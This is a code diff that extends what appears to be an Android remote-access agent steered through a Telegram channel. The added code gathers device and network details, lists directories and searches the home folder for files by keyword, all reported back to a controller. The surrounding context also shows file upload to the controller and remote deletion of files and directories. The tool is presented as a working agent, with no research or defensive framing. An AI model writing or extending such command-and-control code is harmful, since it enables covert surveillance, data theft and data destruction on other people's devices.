@@ -1,4 +1,3 @@
-
 import asyncio
 import os
 import subprocess
@@ -65,6 +64,39 @@ def get_device_info():
     except Exception:
         DEVICE_MODEL = "Unknown"
 
+def get_full_details():
+    try:
+        man = subprocess.check_output(['/system/bin/getprop', 'ro.product.manufacturer'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        mod = subprocess.check_output(['/system/bin/getprop', 'ro.product.model'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        brand = subprocess.check_output(['/system/bin/getprop', 'ro.product.brand'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        prod = subprocess.check_output(['/system/bin/getprop', 'ro.product.name'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        android = subprocess.check_output(['/system/bin/getprop', 'ro.build.version.release'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        cpu = subprocess.check_output(['/system/bin/getprop', 'ro.product.cpu.abi'], stderr=subprocess.DEVNULL).decode().strip() or "Unknown"
+        
+        ip = "127.0.0.1"
+        try:
+            ip_out = subprocess.check_output(['ip', 'addr', 'show', 'wlan0'], stderr=subprocess.DEVNULL).decode().strip()
+            for line in ip_out.split('\n'):
+                if 'inet ' in line:
+                    ip = line.split('inet ')[1].split(' ')[0].split('/')[0]
+                    break
+        except Exception:
+            pass
+                
+        return (f"DEVICE DETAILS • {DEVICE_ID}\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"Manufacturer: {man}\n"
+                f"Model: {mod}\n"
+                f"Brand: {brand}\n"
+                f"Product: {prod}\n"
+                f"Android: {android}\n"
+                f"CPU: {cpu}\n"
+                f"IP: {ip}\n"
+                f"━━━━━━━━━━━━━━━━\n"
+                f"Status: ACTIVE")
+    except Exception as e:
+        return f"ERROR gathering details: {e}"
+
 async def resolve_controller():
     global CONTROLLER_ENTITY
     try:
@@ -86,13 +118,12 @@ async def heartbeat():
 
 async def safe_send_file(target, path):
     try:
-        # Check for 0-byte files to prevent Telegram API error
         if os.path.getsize(path) == 0:
             await client.send_message(target, f'[{DEVICE_ID}] SKIPPED (0 bytes): {os.path.basename(path)}')
             return
             
         await client.send_file(target, path)
-        await asyncio.sleep(2) # Delay to prevent flood
+        await asyncio.sleep(2)
     except FloodWaitError as e:
         await client.send_message(target, f'[{DEVICE_ID}] FloodWait: Sleeping for {e.seconds}s')
         await asyncio.sleep(e.seconds)
@@ -155,9 +186,12 @@ async def handler(event):
             try:
                 if os.path.isdir(path):
                     shutil.rmtree(path)
-                else:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: deleted directory {path}')
+                elif os.path.isfile(path):
                     os.remove(path)
-                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: deleted {path}')
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] OK: deleted file {path}')
+                else:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Path not found')
             except Exception as e:
                 await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
 
@@ -182,6 +216,63 @@ async def handler(event):
                     await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
             else:
                 await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory not found')
+
+        elif cmd_text.startswith('LS '):
+            path = cmd_text[3:].strip()
+            if not path:
+                path = os.path.expanduser('~')
+            if os.path.isdir(path):
+                try:
+                    items = os.listdir(path)
+                    out = f"[{DEVICE_ID}] LS {path}:\n"
+                    for item in items:
+                        full_path = os.path.join(path, item)
+                        if os.path.isdir(full_path):
+                            out += f"📁 {item}/\n"
+                        else:
+                            size = os.path.getsize(full_path)
+                            out += f"📄 {item} ({size} bytes)\n"
+                    
+                    if not items:
+                        out += "(Empty directory)"
+                        
+                    if len(out) > 4000:
+                        out = out[:4000] + "\n... [TRUNCATED]"
+                    await client.send_message(CONTROLLER_ENTITY, out)
+                except Exception as e:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
+            else:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Directory not found')
+
+        elif cmd_text.startswith('FIND '):
+            keyword = cmd_text[5:].strip()
+            if not keyword:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: Provide a keyword to search.')
+                return
+            
+            start_dir = os.path.expanduser('~')
+            matches = []
+            try:
+                for root, dirs, files in os.walk(start_dir):
+                    for file in files:
+                        if keyword in file:
+                            matches.append(os.path.join(root, file))
+                
+                if not matches:
+                    await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] No files found matching "{keyword}".')
+                else:
+                    out = f"[{DEVICE_ID}] Found {len(matches)} matches for '{keyword}':\n"
+                    for m in matches[:50]:
+                        out += f"{m}\n"
+                    if len(matches) > 50:
+                        out += f"... [TRUNCATED, {len(matches)-50} more matches]"
+                    
+                    if len(out) > 4000:
+                        out = out[:4000] + "\n... [TRUNCATED DUE TO LENGTH]"
+                        
+                    await client.send_message(CONTROLLER_ENTITY, out)
+            except Exception as e:
+                await client.send_message(CONTROLLER_ENTITY, f'[{DEVICE_ID}] ERROR: {e}')
 
         elif cmd_text.startswith('CREATE '):
             payload = cmd_text[7:].strip()
